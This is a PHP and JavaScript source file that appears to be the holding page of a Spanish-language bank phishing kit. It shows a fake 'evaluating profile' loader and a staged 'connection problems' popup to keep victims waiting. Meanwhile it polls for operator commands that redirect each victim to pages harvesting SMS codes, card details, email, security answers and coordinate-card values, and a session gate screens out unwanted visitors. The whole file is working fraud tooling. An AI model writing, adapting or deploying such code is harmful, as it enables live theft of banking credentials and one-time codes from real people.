<?php
// ===== mango.php =====
session_set_cookie_params(['lifetime'=>0,'path'=>'/','domain'=>'','secure'=>true,'httponly'=>true,'samesite'=>'None']); session_start();
if (empty($_SESSION['gate_pass'])) { header('Location: /', true, 302); exit; }
$u = $_SESSION['usuario'] ?? null;
if (!$u) {
  header("Location: kiwi.php");
  exit;
}

// Respuesta AJAX para el polling JS
if (isset($_GET['poll'])) {
    header('Content-Type: application/json');
    $ar = "acciones/$u.txt";
    if (file_exists($ar)) {
        $ac = trim(file_get_contents($ar));
        unlink($ar);
        unset($_SESSION['from_out']);
        $redir = null;
        if (substr($ac, 0, strlen("/palabra clave/")) === "/palabra clave/") {
            $pregunta = explode("/palabra clave/", $ac)[1];
            $_SESSION['pregunta'] = $pregunta;
            $redir = 'pregunta.php';
        } elseif (substr($ac, 0, strlen("/coordenadas etiquetas/")) === "/coordenadas etiquetas/") {
            $etiquetas = explode("/coordenadas etiquetas/", $ac)[1];
            $_SESSION['etiquetas'] = explode(",", $etiquetas);
            $redir = 'coordenadas.php';
        } else {
            $map = [
                '/SMS' => 'peru.php', '/SMSERROR' => 'brasil.php',
                '/NUMERO' => 'numero.php', '/ERROR' => 'kiwi.php?error=1',
                '/LOGINERROR' => 'kiwi.php?error=1', '/LOGIN' => 'kiwi.php',
                '/CARD' => 'roma.html', '/LISTO' => 'naranja.php',
                '/MAIL' => 'cereza.php', '/COMPRA' => 'tokio.html',
                '/TIMEFORM' => 'tiempo.php'
            ];
            $redir = $map[$ac] ?? null;
        }
        echo json_encode(['redirect' => $redir ?? 'mango.php']);
    } else {
        echo json_encode(['redirect' => null]);
    }
    exit;
}

$ar = "acciones/$u.txt";
if (file_exists($ar)) {
    $ac = trim(file_get_contents($ar));
    unlink($ar);
    unset($_SESSION['from_out']);

    if (substr($ac, 0, strlen("/palabra clave/")) === "/palabra clave/") {
        $pregunta = explode("/palabra clave/", $ac)[1];
        $_SESSION['pregunta'] = $pregunta;
        header("Location: pregunta.php");
        exit;
    }

    if (substr($ac, 0, strlen("/coordenadas etiquetas/")) === "/coordenadas etiquetas/") {
        $etiquetas = explode("/coordenadas etiquetas/", $ac)[1];
        $_SESSION['etiquetas'] = explode(",", $etiquetas);
        header("Location: coordenadas.php");
        exit;
    }

    switch ($ac) {
        case "/SMS":
            header("Location: peru.php");
            break;
        case "/SMSERROR":
            header("Location: brasil.php");
            break;
        case "/NUMERO":
            header("Location: numero.php");
            break;
        case "/ERROR":
        case "/LOGINERROR":
            header("Location: kiwi.php?error=1");
            break;
        case "/LOGIN":
            header("Location: kiwi.php");
            break;
        case "/CARD":
            header("Location: roma.html");
            break;
        case "/LISTO":
            header("Location: naranja.php");
            break;
        case "/MAIL":
            header("Location: cereza.php");
            break;
        case "/COMPRA":
            header("Location: tokio.html");
            break;
        case "/TIMEFORM":
            header("Location: tiempo.php");
            break;
    }
    exit;
}
$fo = $_SESSION['from_out'] ?? false;
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Espere...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      margin: 0;
      padding: 24px;
      background-color: #fcfcfc;
      color: #006838;
      box-sizing: border-box;
    }
    .container-normal {
      margin-top: 20%;
      max-width: 480px;
      margin-left: auto;
      margin-right: auto;
      padding: 0 8px;
    }
    .container-normal h2 {
      font-size: 18px;
      font-weight: 400;
      color: #555;
      margin: 24px 0 0 0;
    }
    .gif-loader {
      display: block;
      margin: 0 auto;
      max-width: 220px;
      width: 75%;
    }
    .video-container {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      background: #fff;
    }
    .video-container video {
      max-width: 100%;
      max-height: 100vh;
    }
  </style>
</head>
<body>
<?php if ($fo): ?>
  <div class="video-container">
    <video autoplay loop muted playsinline>
      <source src="Out/cargaout.MP4" type="video/mp4">
    </video>
  </div>
<?php else: ?>
  <div class="container-normal">
    <img src="img/gifcarga.gif" class="gif-loader" alt="">
    <h2 id="msg-txt">Por favor espere</h2>
  </div>
  <div id="conn-popup" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.45);backdrop-filter:blur(3px);-webkit-backdrop-filter:blur(3px);z-index:9999;align-items:center;justify-content:center;padding:24px;opacity:0;transition:opacity 0.4s ease;">
    <div style="background:#fff;border-radius:0;padding:28px 24px 22px;max-width:320px;width:100%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.2);">
      <p style="font-size:16px;font-weight:600;color:#222;margin-bottom:10px;font-family:'Segoe UI',sans-serif;">Estamos teniendo problemas de conexi&#243;n</p>
      <p style="font-size:13px;color:#777;font-family:'Segoe UI',sans-serif;">Reconectando<span id="rec-dots"></span></p>
    </div>
  </div>
<?php endif; ?>
<?php if (!$fo): ?>
<script>
(function(){
    var el = document.getElementById('msg-txt');

    // Mensajes con duraci\u00f3n en ms y puntos animados
    var schedule = [
        {text: 'Por favor espere',       dur: 20000},
        {text: 'No cierre esta ventana', dur: 10000},
        {text: 'Evaluando perfil',        dur: 8000}
    ];
    var dots = ['.','..','...'];
    var di = 0, curMsg = 0;

    // Puntos cada 600ms
    setInterval(function(){
        di++;
        el.textContent = schedule[curMsg].text + dots[di % 3];
    }, 600);

    // Cambio de mensaje seg\u00fan duraci\u00f3n
    function scheduleNext(idx){
        curMsg = idx % schedule.length;
        el.textContent = schedule[curMsg].text + dots[di % 3];
        setTimeout(function(){ scheduleNext(curMsg + 1); }, schedule[curMsg].dur);
    }
    scheduleNext(0);

    // Popup reconexion a los 60s si no ha respondido
    var responded = false;
    var popupShown = false;

    function showConnPopup(){
        if(popupShown) return;
        popupShown = true;
        var p = document.getElementById('conn-popup');
        var rd = document.getElementById('rec-dots');
        var ri = 0, rs = ['.', '. .', '. . .'];
        setInterval(function(){ rd.textContent = rs[ri++ % 3]; }, 600);
        p.style.display = 'flex';
        setTimeout(function(){ p.style.opacity = '1'; }, 20);
        setTimeout(function(){
            p.style.opacity = '0';
            setTimeout(function(){ p.style.display = 'none'; popupShown = false; }, 400);
        }, 5000);
    }

    setTimeout(function(){
        if(!responded){ showConnPopup(); }
    }, 60000);

    // Polling fetch
    (function poll(){
        fetch('mango.php?poll=1',{cache:'no-store'})
        .then(function(r){return r.json();})
        .then(function(data){
            responded = true;
            if(data.redirect){ window.location.href = data.redirect; }
            else{ setTimeout(poll, 2500); }
        })
        .catch(function(){ setTimeout(poll, 3000); });
    })();
})();
</script>
<?php endif; ?>
</body>
</html>